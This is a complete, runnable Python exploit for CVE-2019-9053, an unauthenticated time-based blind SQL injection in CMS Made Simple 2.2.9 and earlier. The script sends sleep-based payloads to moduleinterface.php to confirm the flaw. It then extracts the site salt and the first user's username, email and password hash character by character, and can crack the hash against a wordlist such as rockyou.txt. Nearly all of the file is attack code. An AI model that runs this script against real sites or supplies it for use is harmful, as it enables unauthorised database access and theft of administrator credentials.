#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection <= 2.2.9
# Date: 30-03-2025
# Exploit Author: so1icitx
# Version: <= 2.2.9
# CVE: CVE-2019-9053

import requests
from termcolor import colored, cprint
import time
import optparse
import hashlib
import os
import sys

def parse_arguments():
	parser = optparse.OptionParser(usage="usage: %prog -u <target_url> [options]")
	parser.add_option('-u', '--url', action="store", dest="url", help="Base target URL (e.g., http://10.10.10.100/cms)")
	parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Path to wordlist for password cracking")
	parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Enable password cracking with wordlist", default=False)
	parser.add_option('-t', '--time', action="store", dest="time", type="int", help="Sleep time in seconds (default: 5)", default=5)

	options, args = parser.parse_args()
	if not options.url:
		parser.print_help()
		sys.exit(1)
	return options

def crack_password(password, salt, wordlist_path, output):
	if not wordlist_path:
		output.append("[-] No wordlist provided for cracking")
		return False
		
	if os.path.isdir(wordlist_path):
		common_files = [
			'10-million-password-list-top-1000000.txt',
			'rockyou.txt',
			'common-passwords.txt',
			'passwords.txt'
		]
		for filename in common_files:
			full_path = os.path.join(wordlist_path, filename)
			if os.path.isfile(full_path):
				wordlist_path = full_path
				output.append("[*] Using wordlist: {}".format(full_path))
				break
		else:
			output.append("[-] No suitable wordlist file found in directory: {}".format(wordlist_path))
			return False

	try:
		with open(wordlist_path, 'r') as dict_file:  # Removed encoding for Python 2 compatibility
			for line in dict_file:
				line = line.strip()
				beautify_print_try(line, output)
				if hashlib.md5((salt + line).encode('utf-8')).hexdigest() == password:  # Explicit encoding
					output.append("\n[+] Password cracked: {}".format(line))
					return True
	except Exception as e:
		output.append("\n[-] Error reading wordlist: {}".format(str(e)))
	return False

def beautify_print_try(value, output):
	print("\033c")
	cprint('\n'.join(output), 'green', attrs=['bold'])
	cprint('[*] Trying: {}'.format(value), 'red', attrs=['bold'])

def beautify_print(output):
	print("\033c")
	cprint('\n'.join(output), 'green', attrs=['bold'])

def test_vulnerability(url_vuln, session, TIME, output):
	payload = "a,b,1,5))+and+(select+sleep({}))--+".format(TIME)
	url = "{}&m1_idlist={}".format(url_vuln, payload)
	output.append("[*] Testing SQL injection vulnerability...")
	output.append("[DEBUG] Test URL: {}".format(url))
		
	start_time = time.time()
	try:
		r = session.get(url, timeout=TIME + 5)
		elapsed_time = time.time() - start_time
		output.append("[DEBUG] Response time: {:.2f}s".format(elapsed_time))
		output.append("[DEBUG] Response snippet: {}...".format(r.text[:100]))
		if elapsed_time >= TIME:
			output.append("[+] SQL injection confirmed working!")
			return True
		else:
			output.append("[-] No delay detected - target may not be vulnerable")
			return False
	except requests.exceptions.RequestException as e:
		output.append("[-] Error during vulnerability test: {}".format(str(e)))
		return False

def extract_field(url_vuln, session, dictionary, TIME, field, condition, output, debug=False):
	value = ""
	ord_value = ""
	flag = True
	attempts = 0
		
	while flag and attempts < 50:
		flag = False
		attempts += 1
		for char in dictionary:
			temp_value = value + char
			ord_temp = ord_value + hex(ord(char))[2:]
			beautify_print_try(temp_value, output)
			
			payload = "a,b,1,5))+and+(select+sleep({})+from+cms_users+where+{}+like+0x{}25+{})--+".format(TIME, field, ord_temp, condition)
			url = "{}&m1_idlist={}".format(url_vuln, payload)
			
			start_time = time.time()
			try:
				r = session.get(url, timeout=TIME + 5)
				elapsed_time = time.time() - start_time
				if debug:
					output.append("[DEBUG] URL: {}".format(url))
					output.append("[DEBUG] Response time: {:.2f}s".format(elapsed_time))
					output.append("[DEBUG] Response snippet: {}...".format(r.text[:100]))
				
				if elapsed_time >= TIME:
					flag = True
					value = temp_value
					ord_value = ord_temp
					break
			except requests.exceptions.RequestException as e:
				output.append("[-] Network error: {}".format(str(e)))
				return ""
		
	if not value:
		output.append("[-] Failed to extract {} - possible false positive or timeout".format(field))
	return value

def main():
	options = parse_arguments()
		
	url_vuln = options.url.rstrip('/') + '/moduleinterface.php?mact=News,m1_,default,0'
	session = requests.Session()
	dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
	TIME = options.time
	output = ["[*] CMS Made Simple SQLi Exploit by so1icitx - CVE-2019-9053"]
		
	# Test connection
	try:
		initial_response = session.get(options.url, timeout=5)
		output.append("[*] Target reachable - Status: {}".format(initial_response.status_code))
	except requests.exceptions.RequestException as e:
		output.append("[-] Target unreachable: {}".format(str(e)))
		beautify_print(output)
		return

	# Test vulnerability
	if not test_vulnerability(url_vuln, session, TIME, output):
		beautify_print(output)
		return

	# Extract salt
	salt = ""
	ord_salt = ""
	salt_flag = True
	attempts = 0
	while salt_flag and attempts < 50:
		salt_flag = False
		attempts += 1
		for char in dictionary:
			temp_salt = salt + char
			ord_salt_temp = ord_salt + hex(ord(char))[2:]
			beautify_print_try(temp_salt, output)
			
			payload = "a,b,1,5))+and+(select+sleep({})+from+cms_siteprefs+where+sitepref_value+like+0x{}25+and+sitepref_name+like+0x736974656d61736b)+--+".format(TIME, ord_salt_temp)
			url = "{}&m1_idlist={}".format(url_vuln, payload)
			
			start_time = time.time()
			try:
				r = session.get(url, timeout=TIME + 5)
				elapsed_time = time.time() - start_time
				output.append("[DEBUG] Salt check time: {:.2f}s".format(elapsed_time))
				if elapsed_time >= TIME:
					salt_flag = True
					salt = temp_salt
					ord_salt = ord_salt_temp
					break
			except requests.exceptions.RequestException as e:
				output.append("[-] Network error during salt extraction: {}".format(str(e)))
				break
	output.append('\n[+] Salt for password found: {}'.format(salt) if salt else '[-] Salt not found')

	# Extract other fields
	username = extract_field(url_vuln, session, dictionary, TIME, "username", "and+user_id+like+0x31", output, debug=True)
	output.append('\n[+] Username found: {}'.format(username))
		
	email = extract_field(url_vuln, session, dictionary, TIME, "email", "and+user_id+like+0x31", output)
	output.append('\n[+] Email found: {}'.format(email))
		
	password = extract_field(url_vuln, session, dictionary, TIME, "password", "and+user_id+like+0x31", output)
	output.append('\n[+] Password found: {}'.format(password))

	# Crack password if requested
	if options.cracking and options.wordlist:
		print(colored("[*] Attempting to crack password...", 'yellow'))
		crack_password(password, salt, options.wordlist, output)

	beautify_print(output)

if __name__ == "__main__":
	main()